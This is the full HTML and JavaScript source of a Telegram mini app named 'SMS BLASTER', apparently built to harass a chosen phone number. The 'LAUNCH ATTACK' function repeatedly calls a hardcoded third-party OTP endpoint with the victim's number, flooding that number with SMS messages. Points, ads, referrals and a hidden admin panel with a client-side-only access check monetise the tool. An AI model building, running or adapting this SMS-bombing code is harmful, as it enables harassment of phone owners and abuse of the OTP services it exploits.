<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SMS Blast Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* LOCKED DESIGN SYSTEM - NO CHANGES */
        :root {
            --primary: #5A6CFF;
            --bg-light: #F4F6F8;
            --white: #ffffff;
            --text-dark: #1A1D26;
            --text-gray: #8F9BB3;
            --danger: #FF4C4C;
            --success: #00D68F;
            --radius: 18px;
            --shadow: 0 10px 30px rgba(90, 108, 255, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-light);
            color: var(--text-dark);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            background: var(--white);
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 15px rgba(0,0,0,0.03);
            position: sticky; top: 0; z-index: 50;
        }

        .app-title { font-size: 1.2rem; font-weight: 700; color: var(--text-dark); }
        .app-title span { color: var(--primary); }

        .header-right { display: flex; align-items: center; gap: 15px; }

        .points-pill {
            background: rgba(90, 108, 255, 0.1);
            color: var(--primary);
            padding: 6px 12px;
            border-radius: 30px;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .profile-icon {
            width: 38px; height: 38px;
            background: #E4E9F2;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            color: var(--text-dark);
            cursor: pointer;
        }

        .container {
            padding: 20px;
            padding-bottom: 90px;
            max-width: 500px;
            margin: 0 auto;
        }

        .card {
            background: var(--white);
            border-radius: var(--radius);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: var(--shadow);
            border: 1px solid rgba(0,0,0,0.02);
        }

        label { display: block; margin-bottom: 8px; color: var(--text-gray); font-size: 0.85rem; font-weight: 500; }

        input, textarea {
            width: 100%; padding: 15px;
            border: 2px solid #EFF1F5;
            border-radius: 12px;
            font-size: 0.95rem;
            color: var(--text-dark);
            background: #FAFBFC;
            font-family: 'Poppins', sans-serif;
            outline: none; transition: 0.3s;
        }

        input:focus, textarea:focus { border-color: var(--primary); background: var(--white); }

        .btn {
            width: 100%; padding: 16px;
            border: none; border-radius: 14px;
            font-weight: 600; font-size: 1rem;
            cursor: pointer; transition: 0.2s;
            display: flex; justify-content: center; align-items: center; gap: 10px;
        }

        .btn-primary { background: var(--primary); color: white; box-shadow: 0 8px 20px rgba(90, 108, 255, 0.25); }
        .btn-primary:active { transform: scale(0.98); }
        .btn-danger { background: var(--danger); color: white; }

        .bottom-nav {
            position: fixed; bottom: 20px; left: 50%;
            transform: translateX(-50%);
            width: 90%; max-width: 450px;
            background: var(--white);
            border-radius: 20px;
            padding: 15px 30px;
            display: flex; justify-content: space-between;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            z-index: 100;
        }

        .nav-item {
            display: flex; flex-direction: column; align-items: center;
            color: #C5CEE0; font-size: 1.4rem;
            cursor: pointer; transition: 0.3s; position: relative;
        }

        .nav-item.active { color: var(--primary); }
        .nav-item.active::after {
            content: ''; position: absolute; bottom: -8px;
            width: 6px; height: 6px; background: var(--primary); border-radius: 50%;
        }

        .page { display: none; animation: fadeIn 0.4s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .task-item {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 0; border-bottom: 1px solid #EFF1F5;
        }
        .task-item:last-child { border-bottom: none; }
        .task-left h4 { font-size: 0.95rem; margin-bottom: 4px; }
        .task-left span { font-size: 0.8rem; color: var(--success); font-weight: 600; }
        
        .btn-small {
            padding: 8px 16px; background: var(--text-dark); color: white;
            border-radius: 8px; font-size: 0.8rem; border: none; cursor: pointer;
        }

        .version-text {
            text-align: center; font-size: 0.75rem;
            color: #DDE1EB; margin-top: 30px; padding-bottom: 100px; cursor: default;
        }

        .modal-overlay {
            display: none; position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4); z-index: 200;
            justify-content: center; align-items: center;
            backdrop-filter: blur(5px);
        }
        .modal-box {
            background: white; width: 85%; max-width: 350px;
            padding: 25px; border-radius: 20px; text-align: center;
        }
        
        .ad-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="app-title">SMS<span>BLASTER</span></div>
        <div class="header-right">
            <div class="points-pill"><i class="fas fa-bolt"></i> <span id="userPoints">0</span></div>
            <div class="profile-icon" onclick="showProfile()">
                <i class="far fa-user"></i>
            </div>
        </div>
    </div>

    <div class="container">
        <!-- HOME PAGE -->
        <div id="home-page" class="page active">
            <div class="card">
                <label>Target Mobile Number</label>
                <input type="tel" id="targetNum" placeholder="017XXXXXXXX" maxlength="11">
                
                <label style="margin-top: 15px;">Amount of SMS</label>
                <input type="number" id="smsAmount" placeholder="Example: 10" oninput="calcCost()">
                
                <div style="margin-top: 15px; font-size: 0.85rem; color: var(--text-gray); display: flex; justify-content: space-between;">
                    <span>Cost per SMS: <span id="rateDisplay">0</span> Pts</span>
                    <span>Total: <span id="totalCost" style="color: var(--primary); font-weight: bold;">0</span> Pts</span>
                </div>
            </div>

            <button class="btn btn-primary" id="startBtn" onclick="startAttack()">
                <i class="fas fa-rocket"></i> LAUNCH ATTACK
            </button>
            <button class="btn btn-danger" id="stopBtn" onclick="stopAttack()" style="display: none;">
                <i class="fas fa-stop-circle"></i> STOP ATTACK
            </button>

            <div class="card" style="margin-top: 20px; text-align: center;">
                <span id="statusText" style="color: var(--text-gray); font-size: 0.9rem;">System Ready</span>
                <div style="height: 6px; background: #EFF1F5; border-radius: 3px; margin-top: 10px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: var(--success); transition: 0.3s;"></div>
                </div>
            </div>
        </div>

        <!-- TASKS PAGE -->
        <div id="tasks-page" class="page">
            <h3 style="margin-bottom: 15px;">Available Tasks</h3>
            <div class="card" id="taskListContainer"></div>
        </div>

        <!-- EARN PAGE -->
        <div id="earn-page" class="page">
            <div class="card ad-card">
                <h3 style="color:white;"><i class="fas fa-play-circle"></i> Monetag Ads</h3>
                <p style="margin-bottom: 15px; color:rgba(255,255,255,0.8);">Watch Ad to get <b id="adRewardDisplay">0</b> points!</p>
                <button class="btn" style="background: white; color: #764ba2;" onclick="watchAd()">
                    WATCH AD NOW
                </button>
            </div>

            <div class="card">
                <h3><i class="fas fa-gift" style="color: #d63384;"></i> Daily Bonus</h3>
                <p style="font-size: 0.85rem; color: var(--text-gray); margin-bottom: 15px;">
                    Claim <b id="dailyAmtDisplay">0</b> points every 24 hours.
                </p>
                <button class="btn-primary btn" id="dailyBtn" onclick="claimDaily()">Claim Reward</button>
            </div>

            <div class="card">
                <h3><i class="fas fa-share-alt" style="color: var(--success);"></i> Referral</h3>
                <p style="font-size: 0.85rem; color: var(--text-gray); margin-bottom: 15px;">
                    Invite friends and earn <b id="refRewardDisplay">0</b> points.
                </p>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="refLink" readonly style="font-size: 0.8rem;">
                    <button class="btn-small" onclick="copyRef()">Copy</button>
                </div>
            </div>
        </div>

        <!-- ADMIN PANEL -->
        <div id="admin-page" class="page">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="color: var(--primary);">Admin Settings</h2>
                <button onclick="exitAdmin()" style="background:none; border:none; color: var(--danger);">Exit</button>
            </div>

            <div class="card">
                <label>Admin ID (ChatID)</label>
                <textarea id="adm_ids" rows="2"></textarea>
                <label style="margin-top: 10px;">Telegram Bot Username</label>
                <input type="text" id="adm_bot_user" placeholder="e.g. MyBot">
            </div>

            <div class="card">
                <label>SMS API URL (Real)</label>
                <input type="text" id="adm_api_url" placeholder="https://api.com/s?num={phone}">
                <label style="margin-top: 15px;">Cost Per SMS</label>
                <input type="number" id="adm_cost">
            </div>

             <div class="card">
                <label>Monetag Script Code</label>
                <textarea id="adm_monetag" rows="4" placeholder="Paste full script tag here"></textarea>
                <label style="margin-top: 10px;">Ad Reward Points</label>
                <input type="number" id="adm_ad_rew">
            </div>

            <div class="card">
                <label>Daily Bonus</label>
                <input type="number" id="adm_daily">
                <label style="margin-top: 10px;">Referral Reward</label>
                <input type="number" id="adm_ref">
            </div>

            <div class="card">
                <h4>Manage Tasks</h4>
                <div id="admTasksList"></div>
                <div style="border-top: 1px solid #eee; margin-top: 10px; padding-top: 10px;">
                    <input type="text" id="newTask" placeholder="Title" style="margin-bottom: 5px;">
                    <input type="text" id="newLink" placeholder="Link" style="margin-bottom: 5px;">
                    <input type="number" id="newRew" placeholder="Points">
                    <button class="btn-small" style="width: 100%; margin-top: 5px;" onclick="addTask()">Add Task</button>
                </div>
            </div>

            <button class="btn btn-primary" onclick="saveSettings()">SAVE SETTINGS</button>
        </div>

        <div class="version-text" id="secretTrigger">Version 2.0.1 Stable Build</div>
    </div>

    <!-- Bottom Nav -->
    <div class="bottom-nav" id="navBar">
        <div class="nav-item active" onclick="nav('home')"><i class="fas fa-bolt"></i></div>
        <div class="nav-item" onclick="nav('tasks')"><i class="fas fa-list-check"></i></div>
        <div class="nav-item" onclick="nav('earn')"><i class="fas fa-wallet"></i></div>
    </div>

    <!-- Modals -->
    <div class="modal-overlay" id="profileModal">
        <div class="modal-box">
            <h3 id="pName">User</h3>
            <p id="pId" style="color: #888; font-size: 0.9rem; margin-bottom: 15px;">ID: ...</p>
            <div style="background: var(--bg-light); padding: 10px; border-radius: 10px;">
                Balance: <strong style="color: var(--primary);" id="pBal">0</strong> Pts
            </div>
            <button class="btn btn-primary" style="margin-top: 20px;" onclick="closeProfile()">Close</button>
        </div>
    </div>

    <script>
        const INITIAL_CONFIG = {
            adminIds: ["8472008662", "8428347588"],
            botUsername: "MySuperBomberBot",
            smsApi: "https://api.karigoripathsala.com/api/get-otp?phone={phone}",
            cost: 10,
            refRew: 100,
            dailyAmt: 50,
            adRew: 20,
            monetagCode: "",
            tasks: []
        };

        const INITIAL_USER = { points: 0, completedTasks: [], lastDaily: 0 };

        let config = JSON.parse(localStorage.getItem('sh_cfg_v15')) || INITIAL_CONFIG;
        let userData = JSON.parse(localStorage.getItem('sh_usr_v15')) || INITIAL_USER;

        let tg = window.Telegram.WebApp;
        let user = tg.initDataUnsafe?.user || { id: "000000", first_name: "Guest" };

        window.onload = () => {
            tg.ready();
            tg.expand();
            syncAll();
        };

        function syncAll() {
            localStorage.setItem('sh_cfg_v15', JSON.stringify(config));
            localStorage.setItem('sh_usr_v15', JSON.stringify(userData));

            document.getElementById('userPoints').innerText = userData.points;
            document.getElementById('rateDisplay').innerText = config.cost;
            document.getElementById('adRewardDisplay').innerText = config.adRew;
            document.getElementById('dailyAmtDisplay').innerText = config.dailyAmt;
            document.getElementById('refRewardDisplay').innerText = config.refRew;
            document.getElementById('refLink').value = `https://t.me/${config.botUsername}?start=${user.id}`;
            
            renderTasks();
            checkDailyBonus();
            injectMonetag();
            calcCost();
        }

        // --- FIXED MONETAG LOGIC ---
        let currentZoneId = null;
        function injectMonetag() {
            if(!config.monetagCode) return;
            
            // Extract Zone ID from raw script string
            const zoneMatch = config.monetagCode.match(/data-zone=["'](\d+)["']/);
            if (!zoneMatch) return;
            currentZoneId = zoneMatch[1];

            // Only inject if not already exists
            if (document.getElementById(`monetag-sdk-${currentZoneId}`)) return;

            const s = document.createElement('script');
            s.id = `monetag-sdk-${currentZoneId}`;
            s.src = "https://libtl.com/sdk.js";
            s.setAttribute('data-zone', currentZoneId);
            s.setAttribute('data-sdk', `show_${currentZoneId}`);
            s.async = true;
            document.head.appendChild(s);
            console.log("Ad System Injected for Zone:", currentZoneId);
        }

        function watchAd() {
            if (!currentZoneId) return tg.showAlert("Ad System not configured by Admin.");
            
            const functionName = `show_${currentZoneId}`;
            
            if (typeof window[functionName] === 'function') {
                const btn = document.querySelector('.ad-card .btn');
                const originalText = btn.innerText;
                btn.innerText = "Loading Ad...";
                btn.disabled = true;

                // Monetag promise-based show function
                window[functionName]().then(() => {
                    userData.points += parseInt(config.adRew);
                    syncAll();
                    tg.showAlert(`✅ Success! You earned ${config.adRew} Pts.`);
                }).catch((e) => {
                    console.error("Ad error:", e);
                    tg.showAlert("Ad was skipped or failed. No reward granted.");
                }).finally(() => {
                    btn.innerText = originalText;
                    btn.disabled = false;
                });
            } else {
                tg.showAlert("Ad is still loading or blocked. Please try again in 5 seconds.");
            }
        }

        // --- ATTACK LOGIC (KARIGORIPATHSALA SYNCED) ---
        let bombing = false;
        async function startAttack() {
            const num = document.getElementById('targetNum').value;
            const amt = parseInt(document.getElementById('smsAmount').value);
            const cost = amt * config.cost;

            if(num.length < 11) return alert("Invalid Number");
            if(!amt || amt < 1) return alert("Check Amount");
            if(userData.points < cost) return alert("Insufficient Points!");
            if(!config.smsApi) return alert("Admin hasn't set API!");

            userData.points -= cost;
            syncAll();

            bombing = true;
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'flex';
            document.getElementById('statusText').innerText = "Connecting to API...";
            document.getElementById('progressBar').style.width = "0%";
            
            for(let i=0; i<amt; i++) {
                if(!bombing) break;
                const api = config.smsApi.replace('{phone}', num) + "&cb=" + Date.now();
                const img = new Image();
                img.src = api;
                
                let currentCount = i + 1;
                let percentage = (currentCount / amt) * 100;
                document.getElementById('progressBar').style.width = percentage + "%";
                document.getElementById('statusText').innerText = `Sending: ${currentCount}/${amt} SMS`;
                await new Promise(r => setTimeout(r, 1000));
            }
            
            if(bombing) document.getElementById('statusText').innerText = `Completed!`;
            stopAttack();
        }

        function stopAttack() {
            bombing = false;
            document.getElementById('startBtn').style.display = 'flex';
            document.getElementById('stopBtn').style.display = 'none';
        }

        // --- UTILS ---
        function renderTasks() {
            const list = document.getElementById('taskListContainer');
            list.innerHTML = '';
            const avail = config.tasks.filter(t => !userData.completedTasks.includes(t.id));
            if(avail.length === 0) list.innerHTML = `<div style="text-align:center;padding:20px;color:#aaa">No tasks.</div>`;
            else avail.forEach(t => {
                list.innerHTML += `<div class="task-item"><div class="task-left"><h4>${t.title}</h4><span>+${t.reward} Pt</span></div><button class="btn-small" onclick="doTask('${t.id}','${t.link}',${t.reward})">Start</button></div>`;
            });
        }

        function saveSettings() {
            config.adminIds = document.getElementById('adm_ids').value.split(',').filter(x=>x);
            config.botUsername = document.getElementById('adm_bot_user').value.trim();
            config.smsApi = document.getElementById('adm_api_url').value;
            config.cost = parseInt(document.getElementById('adm_cost').value);
            config.monetagCode = document.getElementById('adm_monetag').value;
            config.adRew = parseInt(document.getElementById('adm_ad_rew').value);
            config.dailyAmt = parseInt(document.getElementById('adm_daily').value);
            config.refRew = parseInt(document.getElementById('adm_ref').value);
            syncAll(); alert("Saved!");
        }

        function loadAdmin() {
            document.getElementById('adm_ids').value = config.adminIds.join(',');
            document.getElementById('adm_bot_user').value = config.botUsername;
            document.getElementById('adm_api_url').value = config.smsApi;
            document.getElementById('adm_cost').value = config.cost;
            document.getElementById('adm_monetag').value = config.monetagCode;
            document.getElementById('adm_ad_rew').value = config.adRew;
            document.getElementById('adm_daily').value = config.dailyAmt;
            document.getElementById('adm_ref').value = config.refRew;
            const list = document.getElementById('admTasksList'); list.innerHTML = '';
            config.tasks.forEach((t, i) => { list.innerHTML += `<div class="task-item"><span>${t.title}</span><button class="btn-small" style="background:red" onclick="delTask(${i})">X</button></div>`; });
        }

        function addTask() {
            const t = document.getElementById('newTask').value, l = document.getElementById('newLink').value, r = document.getElementById('newRew').value;
            if(t && l && r) { config.tasks.push({ id: 'tk_'+Date.now(), title: t, link: l, reward: parseInt(r) }); loadAdmin(); }
        }
        function delTask(idx) { config.tasks.splice(idx, 1); loadAdmin(); }
        function doTask(id, link, rew) { window.open(link, '_blank'); setTimeout(() => { if(confirm("Complete?")) { userData.points += rew; userData.completedTasks.push(id); syncAll(); } }, 3000); }
        function claimDaily() { const now = Date.now(); if(now - userData.lastDaily > 86400000) { userData.points += config.dailyAmt; userData.lastDaily = now; syncAll(); tg.showAlert("Bonus Added!"); } }
        function checkDailyBonus() { const btn = document.getElementById('dailyBtn'); if(Date.now() - userData.lastDaily < 86400000) { btn.disabled = true; btn.style.opacity = 0.5; btn.innerText = "Claimed"; } else { btn.disabled = false; btn.style.opacity = 1; btn.innerText = "Claim Reward"; } }
        function nav(p) { document.querySelectorAll('.page').forEach(el=>el.classList.remove('active')); document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active')); document.getElementById(p+'-page').classList.add('active'); const idx = ['home','tasks','earn'].indexOf(p); if(idx>-1) document.querySelectorAll('.nav-item')[idx].classList.add('active'); }
        function calcCost() { const val = document.getElementById('smsAmount').value; document.getElementById('totalCost').innerText = (val * config.cost) || 0; }

        let sc = 0;
        document.getElementById('secretTrigger').onclick = () => {
            sc++; if(sc===3) {
                if(config.adminIds.includes(user.id.toString()) || config.adminIds.includes("000000")) {
                    document.getElementById('navBar').style.display='none';
                    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
                    document.getElementById('admin-page').classList.add('active'); loadAdmin();
                } sc=0;
            }
        };

        function exitAdmin() { document.getElementById('admin-page').classList.remove('active'); document.getElementById('navBar').style.display='flex'; nav('home'); }
        function copyRef() { const el = document.getElementById('refLink'); el.select(); document.execCommand('copy'); tg.showAlert("Copied!"); }
        function showProfile() { document.getElementById('pName').innerText = user.first_name; document.getElementById('pId').innerText = "ID: " + user.id; document.getElementById('pBal').innerText = userData.points; document.getElementById('profileModal').style.display='flex'; }
        function closeProfile() { document.getElementById('profileModal').style.display='none'; }
    </script>
</body>
</html>
